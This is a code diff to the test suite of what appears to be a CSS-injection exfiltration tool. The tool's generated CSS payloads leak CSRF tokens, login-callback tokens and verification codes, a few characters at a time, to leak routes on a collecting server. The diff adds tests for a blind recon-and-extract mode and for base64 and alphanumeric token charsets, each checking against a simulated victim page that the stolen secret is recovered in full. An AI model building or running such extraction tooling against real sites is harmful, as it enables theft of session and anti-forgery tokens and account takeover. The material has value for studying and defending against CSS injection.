@@ -9,7 +9,7 @@ const test = require('node:test');
 const assert = require('node:assert/strict');
 
 const { app, PRESETS } = require('../server');
-const { generateCSS } = require('../public/payload');
+const { generateCSS, pathChunk, CHARSETS, alphabetOf } = require('../public/payload');
 const { SEED, rng, leak, parsePayload } = require('./helpers');
 
 const SETTLE_MS = Number(process.env.FRAG_SETTLE_MS);
@@ -41,7 +41,7 @@ async function configure(user) {
   return parsePayload(generateCSS(config, base));
 }
 
-const send = ({ t, c }) => fetch(`${base}/${t === 'm' ? '' : t + '/'}${c}`).then(r => r.arrayBuffer());
+const send = ({ t, c }) => fetch(`${base}/${t === 'm' ? '' : t + '/'}${pathChunk(c)}`).then(r => r.arrayBuffer());
 const token = () => fetch(base + '/api/token').then(r => r.json());
 
 async function extract(rules, value, order, { gapMs = 0, settle = true } = {}) {
@@ -153,12 +153,50 @@ test('a burst longer than the settle time keeps chunks sent before a late start'
   assert.ok(listed(final, secret), JSON.stringify(final));
 });
 
+test('non-hex tokens, case included, over HTTP (slashes arrive as %2F)', async () => {
+  const r = rng(SEED + 16);
+  for (const charset of ['alnum', 'base64', 'base64url']) {
+    const alphabet = alphabetOf(CHARSETS[charset]).replace('=', '');
+    for (const [preset, length] of [['anchor', 24], ['hidden', 40]]) {
+      const rules = await configure({ ...PRESETS[preset], tokenLength: length, charset, windowSize: 4 });
+      assert.ok(rules.some(q => q.t === 'c'), 'case pairs are probed');
+      // Make sure the "/" path is exercised for base64.
+      const secret = (charset === 'base64' ? 'a/B' : '') + r.chars(alphabet, length - (charset === 'base64' ? 3 : 0));
+      const value = preset === 'hidden' ? secret : 'https://example.com/m/callback/email?token=' + secret +
+        '&operation=login&state=medium&rememberMe=false&x=' + r.chars(alphabet, r.int(4, 40));
+      const { final } = await extract(rules, value, reqs => r.shuffle(reqs));
+      assert.equal(final.status, 'ok', JSON.stringify(final));
+      assert.ok(listed(final, secret), `${charset} ${preset} ${secret}: ${JSON.stringify(final)}`);
+      assert.equal(final.caseUnresolved, undefined);
+    }
+  }
+  const config = await (await fetch(base + '/config')).json();
+  assert.equal(config.charset, 'base64url');
+  assert.equal(config.windowSize, 3, 'non-hex charsets clamp to 3-char windows');
+});
+
+test('non-hex leak routes only accept chunks in the configured charset', async () => {
+  await configure({ ...PRESETS.anchor, charset: 'alnum' });
+  for (const path of ['/ABC', '/a%2Fb', '/a-b', '/c/12', '/c/aBc', '/s/a%2F', '/abcd']) {
+    assert.equal((await fetch(base + path)).status, 404, path);
+  }
+  for (const path of ['/abc', '/z9q', '/c/aB', '/c/Z1', '/s/zz', '/e/q9']) {
+    assert.equal((await fetch(base + path)).status, 200, path);
+  }
+  await configure({ ...PRESETS.anchor, charset: 'base64' });
+  for (const path of ['/a%2Fb', '/a+=', '/c/%2FA', '/e/%3D%3D']) {
+    assert.equal((await fetch(base + path)).status, 200, path);
+  }
+  assert.equal((await fetch(base + '/a-b')).status, 404, '"-" is base64url only');
+  await configure(PRESETS.anchor);
+});
+
 test('leak routes only accept the lengths the payload uses', async () => {
-  for (const path of ['/abcde', '/ab', '/s/abc', '/e/a', '/s/zz']) {
+  for (const path of ['/abcde', '/ab', '/s/abc', '/e/a', '/s/zz', '/c/aB', '/xyz']) {
     const res = await fetch(base + path);
     assert.equal(res.status, 404, path);
   }
-  for (const path of ['/', '/payload.js']) {
+  for (const path of ['/', '/payload.js', '/config']) {
     const res = await fetch(base + path);
     assert.equal(res.status, 200, path);
   }
@@ -196,8 +234,8 @@ test('blind: recon then extract over HTTP, with unknown lengths', async () => {
   const found = await getJson('/api/recon');
   assert.equal(found.status, 'ok');
   assert.deepEqual(found.fields, [
-    { kind: 'input', name: 'csrf', host: 'form', hex: true },
-    { kind: 'a', name: 'code', host: 'self', hex: null },
+    { kind: 'input', name: 'csrf', host: 'form', charset: 'hex' },
+    { kind: 'a', name: 'code', host: 'self', charset: null },
   ]);
   assert.equal(found.unlistedInputs, true);
 
@@ -214,6 +252,42 @@ test('blind: recon then extract over HTTP, with unknown lengths', async () => {
   assert.equal(tokens.status, 'ok');
   assert.equal(tokens.results[0].token, csrf, JSON.stringify(tokens.results[0]));
   assert.ok(listed(tokens.results[1], code), JSON.stringify(tokens.results[1]));
+});
+
+test('blind: non-hex charsets are detected by recon and extracted over HTTP', async () => {
+  await getJson('/api/blind/reset');
+  const r = rng(SEED + 21);
+  const csrf = 'x/Y+' + r.chars(alphabetOf(CHARSETS.base64).replace('=', ''), 36) + '==';
+  const code = r.chars(alphabetOf(CHARSETS.alnum), 24);
+  const form = el('form', {});
+  const doc = page([
+    form,
+    el('input', { type: 'hidden', name: 'csrf', value: csrf }, { form }),
+    el('a', { href: `/verify?code=${code}&next=home` }),
+  ]);
+  for (const p of requests(doc, B.reconPayload())) await hit(p);
+  await sleep(SETTLE_MS + 50);
+  const found = await getJson('/api/recon');
+  assert.deepEqual(found.fields, [
+    { kind: 'input', name: 'csrf', host: 'form', charset: 'base64' },
+    { kind: 'a', name: 'code', host: 'self', charset: null },
+  ]);
+
+  // URL params aren't probed, so the user picks their charset.
+  const chosen = [found.fields[0], { ...found.fields[1], charset: 'alnum' }];
+  const res = await postJson('/api/blind', { fields: chosen.map(f => ({ ...f, windowSize: 4 })) });
+  assert.equal(res.status, 200);
+  const { fields } = await res.json();
+  assert.deepEqual(fields.map(f => [f.charset, f.windowSize]), [['base64', 3], ['alnum', 3]]);
+
+  for (const p of r.shuffle([...requests(doc, B.extractPayload(fields))])) await hit(p);
+  await sleep(SETTLE_MS + 50);
+  const tokens = await getJson('/api/blind/tokens');
+  assert.ok(listed(tokens.results[0], csrf), JSON.stringify(tokens.results[0]));
+  assert.ok(listed(tokens.results[1], code), JSON.stringify(tokens.results[1]));
+
+  const bad = await postJson('/api/blind', { fields: [{ ...found.fields[0], charset: 'ebcdic' }] });
+  assert.equal(bad.status, 400, 'unknown charsets are rejected');
 });
 
 test('blind: each configuration gets fresh field ids, so payload URLs never repeat', async () => {
